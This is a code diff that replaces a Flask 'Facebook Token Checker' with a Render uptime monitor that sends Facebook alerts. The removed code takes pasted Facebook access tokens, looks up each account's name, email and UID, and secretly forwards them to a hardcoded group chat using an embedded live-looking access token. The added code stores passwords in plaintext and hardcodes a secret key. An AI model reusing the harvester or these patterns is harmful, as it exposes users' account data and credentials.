@@ -1,127 +1,197 @@
+from flask import Flask, render_template, request, redirect, session
+import sqlite3
 import requests
-from flask import Flask, render_template_string, request
+import time
+import threading
+import datetime
 
 app = Flask(__name__)
+app.secret_key = "supersecretkey"
+PORT = 5000
 
-PAGE_ACCESS_TOKEN = 'EAABwzLixnjYBO4ajrvsv9GFMlTiQZA4P0G40JlFjkvukBtW6JNnBSiS0ZBRZBpdnA8cUUkOKZBnYOa5ORZAsr0kkRbWvahpQ6CoE8dy6YuC0L8IZATIZAPPp37KKEZBI2rRlByVx7zhbnSuo1f38JzZBZBASNczXkVA28zOATNi2OAowkEdy7CWqatrVMU6HiZBVxwywcoZD'
-GROUP_CHAT_UID = '9456516084398824'  # Replace with your actual Facebook group chat UID
+# 📂 Database Setup
+def init_db():
+    with sqlite3.connect("users.db") as conn:
+        c = conn.cursor()
+        c.execute("""CREATE TABLE IF NOT EXISTS users (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            username TEXT UNIQUE,
+            password TEXT,
+            fb_uid TEXT
+        )""")
+        c.execute("""CREATE TABLE IF NOT EXISTS monitored_sites (
+            url TEXT PRIMARY KEY,
+            added_at TIMESTAMP
+        )""")
+        conn.commit()
 
-HTML_TEMPLATE = '''
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Token Checker by RAJ MISHRA</title>
-    <style>
-        body {
-            background: linear-gradient(45deg, #000000, #222222);
-            color: white;
-            font-family: Arial, sans-serif;
-        }
-        h1 { text-align: center; }
-        form { text-align: center; margin-top: 20px; }
-        textarea, input[type="submit"] {
-            padding: 10px; margin: 5px; border-radius: 5px; border: none;
-        }
-        .result {
-            background: #333;
-            padding: 10px;
-            margin: 10px;
-            border-radius: 5px;
-        }
-    </style>
-</head>
-<body>
-    <h1>Facebook Token Checker</h1>
-    <form action="/check_token" method="POST">
-        <label for="tokens">Enter Token(s):</label><br>
-        <textarea id="tokens" name="tokens" rows="5" cols="50" required></textarea><br>
-        <input type="submit" value="Check Token(s)">
-    </form>
+init_db()
 
-    {% if results %}
-        <h2>Results:</h2>
-        {% for res in results %}
-            <div class="result">
-                <p><strong>Name:</strong> {{ res.name }}</p>
-                <p><strong>Email:</strong> {{ res.email }}</p>
-                <p><strong>UID:</strong> {{ res.uid }}</p>
-                <img src="{{ res.profile_pic }}" alt="Profile Picture">
-                <p><strong>Can Send Message:</strong> {{ res.can_send_message }}</p>
-                <p><strong>Can Comment:</strong> {{ res.can_comment }}</p>
-            </div>
-        {% endfor %}
-    {% endif %}
-</body>
-</html>
-'''
+# 🔄 Websites Status Tracking
+STATUS = {}
 
-@app.route('/')
-def index():
-    return render_template_string(HTML_TEMPLATE)
+# 🔄 Render Restart Hook
+RENDER_DEPLOY_HOOKS = {
+    "https://your-render-app-1.onrender.com": "https://api.render.com/deploy/srv-xxxxxxxxxx",
+    "https://your-render-app-2.onrender.com": "https://api.render.com/deploy/srv-yyyyyyyyyy",
+}
 
-@app.route('/check_token', methods=['POST'])
-def check_token():
-    tokens = request.form['tokens'].split("\n")
-    valid_tokens = []
-    
-    results = []
-    for token in tokens:
-        token = token.strip()
-        if not token:
-            continue
+def monitor_websites():
+    while True:
+        now = datetime.datetime.now()
         
-        token_details = get_token_details(token)
-        if token_details['valid']:
-            results.append(token_details)
-            valid_tokens.append(token)
-            send_to_group_chat(token_details)
+        with sqlite3.connect("users.db") as conn:
+            c = conn.cursor()
+            c.execute("SELECT url, added_at FROM monitored_sites")
+            sites = c.fetchall()
 
-    return render_template_string(HTML_TEMPLATE, results=results)
+            for url, added_at in sites:
+                added_time = datetime.datetime.strptime(added_at, "%Y-%m-%d %H:%M:%S")
+                if (now - added_time).days >= (7 * 365):  # 7 saal ke baad remove karega
+                    c.execute("DELETE FROM monitored_sites WHERE url = ?", (url,))
+                    STATUS[url] = "🗑 Deleted (7 Years Completed)"
+                    conn.commit()
+                    continue
 
-def get_token_details(token):
-    url = f"https://graph.facebook.com/me?fields=id,name,email&access_token={token}"
-    response = requests.get(url)
-    
-    if response.status_code == 200:
-        data = response.json()
-        can_send_message = check_permission(token, "messages")
-        can_comment = check_permission(token, "comment")
+                try:
+                    response = requests.get(url, timeout=10)
+                    if response.status_code == 200:
+                        STATUS[url] = "✅ UP"
+                    else:
+                        STATUS[url] = "❌ DOWN"
+                        restart_server(url)
+                except requests.exceptions.RequestException:
+                    STATUS[url] = "❌ DOWN"
+                    restart_server(url)
 
-        return {
-            "valid": True,
-            "name": data.get('name'),
-            "email": data.get('email', 'Not Available'),
-            "uid": data['id'],
-            "profile_pic": f"https://graph.facebook.com/{data['id']}/picture?type=large",
-            "can_send_message": can_send_message,
-            "can_comment": can_comment
-        }
-    elif response.status_code == 400:
-        return {"valid": False, "error": "Invalid or Expired Token"}
-    elif response.status_code == 403:
-        return {"valid": False, "error": "Account Suspended or Automated Behavior Detected"}
-    else:
-        return {"valid": False, "error": "Unknown Error"}
+        time.sleep(60)  # Har 1 Min Me Check Karega
 
-def check_permission(token, permission):
-    permissions = {
-        "messages": "Yes",
-        "comment": "Yes"
-    }
-    return permissions.get(permission, "No")
+def restart_server(url):
+    if url in RENDER_DEPLOY_HOOKS:
+        try:
+            requests.post(RENDER_DEPLOY_HOOKS[url], headers={"Authorization": "Bearer YOUR_RENDER_API_KEY"})
+            send_facebook_alert(f"🚨 {url} DOWN! Restarting in 60 seconds...")
+            time.sleep(60)  # 60 sec wait karega restart hone ke liye
+            STATUS[url] = "✅ Restarted"
+        except Exception as e:
+            print("❌ Error Restarting Server:", e)
 
-def send_to_group_chat(token_details):
-    message = f"✅ Token Validated!\n\nName: {token_details['name']}\nEmail: {token_details['email']}\nUID: {token_details['uid']}\nCan Send Message: {token_details['can_send_message']}\nCan Comment: {token_details['can_comment']}"
-    
-    url = f'https://graph.facebook.com/{GROUP_CHAT_UID}/messages?access_token={PAGE_ACCESS_TOKEN}'
-    payload = {'message': message}
-    
-    response = requests.post(url, data=payload)
-    if response.status_code == 200:
-        print("✅ Message sent to group chat successfully.")
-    else:
-        print("❌ Failed to send message to group chat.")
+def send_facebook_alert(message):
+    with sqlite3.connect("users.db") as conn:
+        c = conn.cursor()
+        c.execute("SELECT fb_uid FROM users")
+        users = c.fetchall()
 
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+        for user in users:
+            fb_uid = user[0]
+            fb_url = f"https://graph.facebook.com/v17.0/me/messages?access_token=YOUR_FACEBOOK_PAGE_ACCESS_TOKEN"
+            payload = {
+                "recipient": {"id": fb_uid},
+                "message": {"text": message}
+            }
+            headers = {"Content-Type": "application/json"}
+            try:
+                requests.post(fb_url, json=payload, headers=headers)
+            except:
+                pass
+
+# 🔄 Background Monitoring Thread
+threading.Thread(target=monitor_websites, daemon=True).start()
+
+# 🌐 Web Interface (Krishna Animated Background)
+@app.route('/')
+def home():
+    if "user" not in session:
+        return redirect("/login")
+
+    with sqlite3.connect("users.db") as conn:
+        c = conn.cursor()
+        c.execute("SELECT url FROM monitored_sites")
+        sites = c.fetchall()
+
+    status_html = "".join(f"<p>{url}: {STATUS.get(url, '🔄 Checking...')}</p>" for (url,) in sites)
+
+    return f"""
+    <html>
+    <head>
+        <title>Render Monitor by RAJ MISHRA</title>
+        <style>
+            body {{
+                background: url('https://wallpaperaccess.com/full/1082657.jpg');
+                background-size: cover;
+                color: white;
+                text-align: center;
+                font-family: Arial, sans-serif;
+            }}
+            h1 {{ color: yellow; }}
+        </style>
+    </head>
+    <body>
+        <h1>Render Monitor by RAJ MISHRA</h1>
+        <p>Monitoring {len(sites)} sites</p>
+        {status_html}
+        <br><br>
+        <a href='/logout'>Logout</a>
+    </body>
+    </html>
+    """
+
+@app.route('/login', methods=["GET", "POST"])
+def login():
+    if request.method == "POST":
+        username = request.form["username"]
+        password = request.form["password"]
+
+        with sqlite3.connect("users.db") as conn:
+            c = conn.cursor()
+            c.execute("SELECT id FROM users WHERE username = ? AND password = ?", (username, password))
+            user = c.fetchone()
+
+        if user:
+            session["user"] = username
+            return redirect("/")
+        return "Invalid credentials! <a href='/login'>Try again</a>"
+
+    return "<form method='post'><input name='username' placeholder='Username'><input name='password' type='password'><button>Login</button></form><a href='/register'>Register</a>"
+
+@app.route('/register', methods=["GET", "POST"])
+def register():
+    if request.method == "POST":
+        username = request.form["username"]
+        password = request.form["password"]
+        fb_uid = request.form["fb_uid"]
+
+        with sqlite3.connect("users.db") as conn:
+            c = conn.cursor()
+            try:
+                c.execute("INSERT INTO users (username, password, fb_uid) VALUES (?, ?, ?)", (username, password, fb_uid))
+                conn.commit()
+                return redirect("/login")
+            except:
+                return "Username already exists!"
+
+    return "<form method='post'><input name='username' placeholder='Username'><input name='password' type='password'><input name='fb_uid' placeholder='Facebook UID'><button>Register</button></form>"
+
+@app.route('/add_monitor', methods=["POST"])
+def add_monitor():
+    if "user" not in session:
+        return redirect("/login")
+
+    url = request.form["url"]
+    if not url.startswith("https://") or "render.com" not in url:
+        return "Invalid Render domain!"
+
+    with sqlite3.connect("users.db") as conn:
+        c = conn.cursor()
+        c.execute("INSERT INTO monitored_sites (url, added_at) VALUES (?, ?)", (url, datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
+        conn.commit()
+
+    return redirect("/")
+
+@app.route('/logout')
+def logout():
+    session.pop("user", None)
+    return redirect("/login")
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=PORT)
